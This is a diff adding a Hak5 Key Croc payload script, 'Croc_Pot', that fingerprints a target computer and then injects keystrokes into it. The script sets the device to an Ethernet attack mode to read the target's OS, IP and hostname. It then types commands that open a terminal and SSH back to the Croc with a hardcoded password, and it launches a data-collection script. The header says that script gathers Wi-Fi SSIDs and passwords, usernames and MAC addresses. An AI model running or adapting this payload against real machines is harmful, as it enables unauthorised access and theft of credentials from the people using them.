@@ -1,0 +1,44 @@
+# Title:         Croc_Pot Payload
+# Description:   Start Croc_pot.sh bash script automatically, scan takes about 30-40 sec to start because of OS detection
+#                This will collect some data like (ip address, current user name, pc host name, ssid and passwd, mac address)
+#                save to tools/Croc_pot folder
+# Author:        Spywill
+# Version:       1.1
+# Category:      Key Croc
+#
+#
+MATCH crocpot
+#
+CROC_PW=hak5croc
+PC_PW=LINUX
+echo "${CROC_PW}" > /tmp/CPW.txt
+#
+CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
+echo > ${CROC_OS}
+rm /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt
+ATTACKMODE AUTO_ETHERNET
+LED ATTACK
+GET TARGET_OS
+GET TARGET_IP 
+GET HOST_IP
+GET TARGET_HOSTNAME
+ATTACKMODE HID
+LED G
+sleep 1
+Q GUI-SPACE
+sleep 1
+Q STRING "terminal"
+Q ENTER
+sleep 2
+Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+Q ENTER
+sleep 2
+Q STRING "${CROC_PW}"
+Q ENTER
+sleep 1
+echo "$TARGET_OS" >> ${CROC_OS}
+echo "$TARGET_IP" >> ${CROC_OS}
+echo "$TARGET_HOSTNAME" >> ${CROC_OS}
+echo "$HOST_IP" >> ${CROC_OS}
+Q STRING "/root/udisk/tools/Croc_Pot.sh"
+Q ENTER
